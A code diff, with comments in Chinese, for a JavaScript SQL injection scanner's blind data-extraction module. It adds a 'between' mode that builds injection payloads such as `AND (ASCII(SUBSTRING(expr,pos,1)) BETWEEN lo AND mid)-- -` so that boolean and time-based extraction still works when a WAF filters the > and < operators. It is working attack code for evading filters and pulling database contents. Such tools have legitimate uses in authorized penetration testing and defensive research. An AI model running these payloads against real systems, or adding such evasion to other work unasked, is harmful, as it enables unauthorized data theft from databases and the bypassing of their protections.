@@ -34,6 +34,38 @@ function pickDialectFn(dict, dbms, fallbackKey = 'MySQL') {
   return dict[fallbackKey] || null;
 }
 
+// =====================================================================
+// [D50 2026-10-12] 提取阶段比较算子（--fetch-using）：'gt'（默认）| 'between'
+//
+// 动机：`>` / `<` 被 WAF / 规则过滤而 BETWEEN 仍放行的目标上，默认算子让长度二分与
+// 字节二分全程判假 ⇒ 提取静默失败。本仓的 cls 字符类探测（cls-digits/cls-lower）
+// **早已单方面依赖 BETWEEN 可用**——那条通道的静默失败正是本开关要堵的洞：
+// 类探测失准只会让收敛值越界，再由 extractVerify 等值验证兜底回退，代价是请求数。
+//
+// 'gt'（默认）：`x > mid` 判真 ⇒ lo=mid+1（既有行为，零回归）。
+// 'between'：`x BETWEEN lo AND mid` 判真 ⇒ hi=mid，否则 lo=mid+1。
+//   不变式 x∈[lo,hi] 全程成立（初始 [0,255] 覆盖单字节；cls 命中区间同理），
+//   lo===hi 即收敛（candidate=lo）。探测次数与 gt 同阶（[0,255] 均 ~8 次）。
+//
+// ⚠️ 'in' 不实现（TODO 已留证，非"忘了做"）：`x IN (v1..vk)` 为假时只说明 x 不在
+//   名单内，**无法定位到 k+1 个缺口中的哪一个**，驱动不了窄化；单值 IN 退化为相等
+//   判断（最坏 256 次线性扫描，比二分差一个量级）。
+// ⚠️ 上游归属更正：本能力原登记为"对标 ghauri --fetch-using"——2026-10-12 对
+//   ghauri v1.0.5 与 v1.0.1#dev 整包取证，`--fetch-using`/`fetch_using` 0 命中
+//   （仅方法名 fetch_using_error_based_vector 无关），**ghauri 没有这个参数**，
+//   按技术本身价值落地，不称对标。
+// ⚠️ 边界：等值验证（extractVerify）与 false 基准（1=2）仍用 `=`——`=` 被过滤时
+//   整条通道本就不要命，非本开关可救；blindBitwise 位平面路径无任何比较算子，
+//   天然兼容两种模式。
+// =====================================================================
+/** @returns {'gt'|'between'} 非法值抛错（不静默回落——"传了没生效"是红线） */
+export function resolveFetchUsing(config) {
+  const v = config?.fetchUsing;
+  if (v == null || v === 'gt') return 'gt';
+  if (v === 'between') return 'between';
+  throw new Error(`fetchUsing 仅支持 'gt' | 'between'，收到: ${JSON.stringify(v)}`);
+}
+
   // ===== 盲注二分提取（兜底） =====
 
   // 盲注二分提取单个表达式字符串：长度二分 + 多字符并行二分（并发度 extractConcurrency）
@@ -49,6 +81,8 @@ export async function extractBoolean(ex, ctx, expr) {
     const cacheKey = `${scanId}:${dbms}:${expr}`;
     const targetCache = ex._extractCache.get(ctx.target);
     if (predictOutput && targetCache && targetCache.has(cacheKey)) return targetCache.get(cacheKey);
+    // [D50] 比较算子（默认 gt；between 模式见 resolveFetchUsing 注释）
+    const fetchUsing = resolveFetchUsing(ctx.config);
     const lenFn = pickDialectFn(LEN_FN, dbms);
     const subFn = pickDialectFn(SUB_FN, dbms);
     const asciiFn = pickDialectFn(ASCII_FN, dbms);
@@ -56,11 +90,16 @@ export async function extractBoolean(ex, ctx, expr) {
     if (!lenFn || !subFn || !asciiFn) return null;
 
     // [P2-FIX 长度上界] 撞 255 上界时探测长值延伸（短值零额外请求）
+    // [D50] between 模式的 BETWEEN 上界必须是「恒 ≥ 真实长度」的提取上限（lenCap），
+    //   不能用当前段上界 255 —— `x BETWEEN n+1 AND 255` 在 x>255 时恒假，长值会被
+    //   误判成长度 0（实测：260 字符值 between 模式返回 null）。用 lenCap 后
+    //   `x ∈ (n, lenCap]` ⇔ `x > n` 对段内全部 n 恒成立，顶界语义交给 capped/延伸段。
+    const lenCap = Number(ctx?.config?.blindMaxLen) > 255 ? Math.floor(ctx.config.blindMaxLen) : 4096;
     let len = await _binarySearch(ex, ctx, base, (cmp) =>
       `(${lenFn(expr)})${cmp}`
-    );
+    , {}, fetchUsing, lenCap);
     if (len >= 255) {
-      len = await _extendLength(ex, ctx, base, lenFn(expr), len);
+      len = await _extendLength(ex, ctx, base, lenFn(expr), len, fetchUsing);
     }
     if (len <= 0) return null;
 
@@ -172,6 +211,12 @@ export async function extractBoolean(ex, ctx, expr) {
         }
         const mid = Math.floor((s.lo + s.hi) / 2);
         s._mid = mid;
+        // [D50] between 模式：`x BETWEEN lo AND mid` 判真 ⇒ x∈[lo,mid]（收上界）；
+        //   判假 ⇒ x∈[mid+1,hi]（抬下界）。不变式 x∈[lo,hi] 全程成立 ⇒ lo===hi 即收敛。
+        //   与 gt 模式探测次数同阶；cls 类探测两种模式下完全相同（本就是 BETWEEN）。
+        if (fetchUsing === 'between') {
+          return `${base} AND (${asciiFn(subFn(expr, s.pos))} BETWEEN ${s.lo} AND ${mid})-- -`;
+        }
         return `${base} AND (${asciiFn(subFn(expr, s.pos))}>${mid})-- -`;
       });
       reqs.push(`${base} AND (1=2)-- -`); // 整批共用的 false 基准
@@ -229,10 +274,20 @@ export async function extractBoolean(ex, ctx, expr) {
         }
         // —— 二分阶段（原逻辑不变）——
         const midNow = /** @type {number} */ (s._mid); // 本批请求前已赋值（见上方 s._mid = mid）
-        if (ok) s.lo = midNow + 1;
-        else s.hi = midNow - 1;
-        if (s.lo > s.hi) {
-          const candidate = s.hi + 1; // 收敛出的单字节码值（0–255）
+        // [D50] 两模式收敛判定不同（别合并）：between 不变式 x∈[lo,hi] ⇒ lo===hi 即收敛
+        //   （candidate=lo）；gt 不变式 x∈[lo,hi+1] ⇒ lo>hi 才收敛（candidate=hi+1），
+        //   gt 下 lo===hi 是**未收敛**的中间态（还需一次 mid=lo 的探测），误判会丢候选值。
+        // ⚠️ 收敛判定必须在窄化**之后**算——先算会把上一轮的边界当成本轮结果。
+        if (fetchUsing === 'between') {
+          if (ok) s.hi = midNow;
+          else s.lo = midNow + 1;
+        } else {
+          if (ok) s.lo = midNow + 1;
+          else s.hi = midNow - 1;
+        }
+        const converged = fetchUsing === 'between' ? s.lo >= s.hi : s.lo > s.hi;
+        if (converged) {
+          const candidate = fetchUsing === 'between' ? s.lo : s.hi + 1; // 收敛出的单字节码值（0–255）
           if (extractVerify) {
             // 等值验证：ASCII(SUBSTRING(expr,pos,1)) = candidate 应为真（响应偏离 false 基准）
             const verifyResp = await ex._send(
@@ -381,9 +436,13 @@ function _dynJudge(ex, ctx) {
   // [P0-FIX] 判定接入 autoDynamicBlock（与 extractBoolean 同通道）：动态页下长度二分
   // 原先恒判「真」（长度上界一路打到 255）→ 长度错误导致整条提取失败
   // [P2-FIX 长度上界] range={lo,hi} 支持延伸区间（长度 >255 的长值续段二分，见 _extendLength）
-/** @param {any} ex @param {object} ctx @param {any} base @param {any} makeCond @param {any} range */
-async function _binarySearch(ex, ctx, base, makeCond, range = {}) {
+  // [D50] fetchUsing='between'：探针从 `x>n` 换成 `x BETWEEN n+1 AND cap`（⇔ x>n，
+  //   前提 cap ≥ 真实值——调用方传提取长度上限，见 extractBoolean 的 lenCap 注释）；
+  //   `>` 被 WAF 过滤的目标专用。cap 缺省取段上界（仅兼容直接调用，between 模式勿缺省）。
+/** @param {any} ex @param {object} ctx @param {any} base @param {any} makeCond @param {any} range @param {'gt'|'between'} [fetchUsing] @param {number} [cap] */
+async function _binarySearch(ex, ctx, base, makeCond, range = {}, fetchUsing = 'gt', cap) {
     const judge = _dynJudge(ex, ctx);
+    const hiBound = cap ?? range.hi ?? 255;
     // [P1-FIX 2026-09-17] 二分逻辑交给 binaryProbe（与列数探测共用判据组合）。
     // 原实现只有 judge.truthy 一条判据：目标恒 200 + 错误页回显时它恒判「真」，
     // 长度二分一路打到上界（实测顶到 65531）→ 一个 5 字符的值要提 6.5 万字符 → 超时。
@@ -394,7 +453,10 @@ async function _binarySearch(ex, ctx, base, makeCond, range = {}) {
     //    而 binaryProbe 默认的 'gt' 语义是「判据为真 ⇒ 结果偏大 ⇒ 收缩上界」——
     //    两者方向相反，直接用默认值会把二分倒着跑（实测一次挂掉 21 个用例）。
     const probe = async (n) => {
-      const payload = `${base} AND (${makeCond(`>${n}`)})-- -`;
+      // [D50] between 模式：`x BETWEEN n+1 AND hiBound` ⇔ `x > n`（x≤hiBound 时恒等）；
+      //   n=hiBound 时区间为空 ⇒ 恒假，与 `x>hiBound` 一致。
+      const cmp = fetchUsing === 'between' ? ` BETWEEN ${n + 1} AND ${hiBound}` : `>${n}`;
+      const payload = `${base} AND (${makeCond(cmp)})-- -`;
       const [rTrue, rFalse] = await _sendBatch(ex, ctx, [payload, `${base} AND (1=2)-- -`]);
       // [P1-FIX 2026-09-17] 判定前先剔除「响应中回显的本条 payload」。
       // 目标把 SQL 原样回显时，真/假两侧的响应文本必然不同（SQL 里的条件不同），
@@ -444,8 +506,8 @@ async function _binarySearch(ex, ctx, base, makeCond, range = {}) {
   // [P2-FIX 长度上界延伸] 长度二分撞到 255 上界时，探测真实长度是否 >255（原实现静默截断）：
   // 短值（<255，绝大多数场景）零额外请求；确为长值则在 [256, blindMaxLen] 续段二分。
   // blindMaxLen 可配（config.blindMaxLen，默认 65535），防超长值无限拉取。
-/** @param {any} ex @param {object} ctx @param {any} base @param {any} lenExpr @param {any} current */
-async function _extendLength(ex, ctx, base, lenExpr, current) {
+/** @param {any} ex @param {object} ctx @param {any} base @param {any} lenExpr @param {any} current @param {'gt'|'between'} [fetchUsing] */
+async function _extendLength(ex, ctx, base, lenExpr, current, fetchUsing = 'gt') {
     // [P1-FIX 2026-09-17] 默认上界 65535 → 4096：单字段超过 4K 字符属异常，
   // 拿 65531 去逐字节提取会把一次扫描拖成十几分钟（实测）。真需要更长时用 blindMaxLen 显式放大。
   const maxLen = Number(ctx?.config?.blindMaxLen) > 255 ? Math.floor(ctx.config.blindMaxLen) : 4096;
@@ -455,13 +517,16 @@ async function _extendLength(ex, ctx, base, lenExpr, current) {
     //     是判据失效顶出来的上界 → 判失败（-1），不拿它去逐字节提取。
     if (current < 255 || maxLen <= 255) return ctx?.blindLenCapped ? -1 : current;
     const judge = _dynJudge(ex, ctx);
-    const probe255 = `${base} AND (${lenExpr}>255)-- -`;
+    // [D50] between 模式：`x BETWEEN 256 AND maxLen` ⇔ `x > 255`（x≤maxLen 时恒等）
+    const probe255 = fetchUsing === 'between'
+      ? `${base} AND (${lenExpr} BETWEEN 256 AND ${maxLen})-- -`
+      : `${base} AND (${lenExpr}>255)-- -`;
     const [rTrue, rFalse] = await _sendBatch(ex, ctx, [probe255, `${base} AND (1=2)-- -`]);
     if (rFalse) judge.observe(rFalse?.data, probe255);
     if (!judge.truthy(rTrue, rFalse?.data, probe255)) {
       return ctx?.blindLenCapped ? -1 : current; // 无 capped：真实长度恰为 255
     }
-    const ext = await _binarySearch(ex, ctx, base, (cmp) => `(${lenExpr})${cmp}`, { lo: 256, hi: maxLen });
+    const ext = await _binarySearch(ex, ctx, base, (cmp) => `(${lenExpr})${cmp}`, { lo: 256, hi: maxLen }, fetchUsing, maxLen);
     // 延伸段顶到上界（ext === -1）同样有两种成因，探测层面无法区分：
     //   ① 真实长度 ≥ maxLen —— 合法，按 maxLen 截断提取（既有测试：300 字节值 + blindMaxLen=280）；
     //   ② 判据恒真失效 —— 顶到哪儿都真，maxLen 就是个假长度。
@@ -517,6 +582,8 @@ export async function extractTime(ex, ctx, expr) {
     const subFn = pickDialectFn(SUB_FN, dbms);
     const asciiFn = pickDialectFn(ASCII_FN, dbms);
     if (!lenFn || !subFn || !asciiFn) return null;
+    // [D50] 比较算子（与布尔通道同源；between 模式见 resolveFetchUsing 注释）
+    const fetchUsing = resolveFetchUsing(ctx.config);
     // 时间判定阈值：基线耗时 + timeThresholdMs。**注释一直这么写，代码此前没做**。
     // 本仓另外三条时间路径都是这个口径（TimeBlindDetector 的 μ+z·σ、StackedDetector 的
     // max(阈值, 基线+sleep/2)、DBFingerprinter 的 baselineRtt + 阈值），唯独提取通道漏了。
@@ -552,12 +619,19 @@ export async function extractTime(ex, ctx, expr) {
     };
 
     // 长度二分（同 extractBoolean 的 _binarySearch，但用时间判定）
-    let len = await _timeBinarySearch(ex, ctx, base, (cmp) => `(${lenFn(expr)})${cmp}`, timedTrue);
+    // [D50] between 模式的 BETWEEN 上界取提取长度上限（与布尔通道 lenCap 同理：
+    //   用段上界 255 会让 >255 的长值恒假误判长度 0）
+    const lenCap = Number(ctx?.config?.blindMaxLen) > 255 ? Math.floor(ctx.config.blindMaxLen) : 65535;
+    let len = await _timeBinarySearch(ex, ctx, base, (cmp) => `(${lenFn(expr)})${cmp}`, timedTrue, {}, fetchUsing, lenCap);
     // [P2-FIX 长度上界] 时间通道同样延伸：撞 255 上界时探测真实长度是否 >255（时间判定成本 1 请求）
     if (len >= 255) {
       const maxLen = Number(ctx?.config?.blindMaxLen) > 255 ? Math.floor(ctx.config.blindMaxLen) : 65535;
-      if (maxLen > 255 && (await timedTrue(`(${lenFn(expr)})>255`))) {
-        const ext = await _timeBinarySearch(ex, ctx, base, (cmp) => `(${lenFn(expr)})${cmp}`, timedTrue, { lo: 256, hi: maxLen });
+      // [D50] between 模式：`x BETWEEN 256 AND maxLen` ⇔ `x > 255`
+      const over255 = fetchUsing === 'between'
+        ? await timedTrue(`(${lenFn(expr)}) BETWEEN 256 AND ${maxLen}`)
+        : await timedTrue(`(${lenFn(expr)})>255`);
+      if (maxLen > 255 && over255) {
+        const ext = await _timeBinarySearch(ex, ctx, base, (cmp) => `(${lenFn(expr)})${cmp}`, timedTrue, { lo: 256, hi: maxLen }, fetchUsing, maxLen);
         // 真实长度 ≥ maxLen 时钳位（提取前 maxLen 字节）
         len = Math.min(ext, maxLen);
       }
@@ -574,6 +648,18 @@ export async function extractTime(ex, ctx, expr) {
     const bisectPos = async (pos, lo, hi) => {
       let l = lo;
       let h = hi;
+      if (fetchUsing === 'between') {
+        // [D50] BETWEEN 窄化（与布尔通道同构）：`x BETWEEN l AND mid` 判真 ⇒ h=mid，
+        //   判假 ⇒ l=mid+1；不变式 x∈[l,h] ⇒ l===h 即收敛（candidate=l）。
+        //   gt 模式是 while(l<=h) + candidate=h+1，两模式循环条件不同——别合并。
+        while (l < h) {
+          const mid = Math.floor((l + h) / 2);
+          const ok = await timedTrue(`(${asciiFn(subFn(expr, pos))} BETWEEN ${l} AND ${mid})`);
+          if (ok) h = mid;
+          else l = mid + 1;
+        }
+        return l;
+      }
       while (l <= h) {
         const mid = Math.floor((l + h) / 2);
         const ok = await timedTrue(`(${asciiFn(subFn(expr, pos))}>${mid})`);
@@ -692,14 +778,18 @@ function _sleepCandidates(ex, defaultSec) {
   }
 
   // 时间判定版的通用二分：返回使条件成立的最大值+1（默认 0..255；range 支持延伸区间）
-/** @param {any} ex @param {object} ctx @param {any} base @param {any} makeCond @param {any} timedTrue @param {any} range */
-async function _timeBinarySearch(ex, ctx, base, makeCond, timedTrue, range = {}) {
+  // [D50] fetchUsing='between'：探针从 `x>mid` 换成 `x BETWEEN mid+1 AND cap`（⇔ x>mid，
+  //   前提 cap ≥ 真实值，调用方传提取长度上限；同 _binarySearch 的 cap 注释）
+/** @param {any} ex @param {object} ctx @param {any} base @param {any} makeCond @param {any} timedTrue @param {any} range @param {'gt'|'between'} [fetchUsing] @param {number} [cap] */
+async function _timeBinarySearch(ex, ctx, base, makeCond, timedTrue, range = {}, fetchUsing = 'gt', cap) {
     let lo = range.lo ?? 0;
     let hi = range.hi ?? 255;
     let found = -1;
     while (lo <= hi) {
       const mid = Math.floor((lo + hi) / 2);
-      const ok = await timedTrue(makeCond(`>${mid}`));
+      const upper = cap ?? hi;
+      const cmp = fetchUsing === 'between' ? ` BETWEEN ${mid + 1} AND ${upper}` : `>${mid}`;
+      const ok = await timedTrue(makeCond(cmp));
       if (ok) {
         found = mid;
         lo = mid + 1;
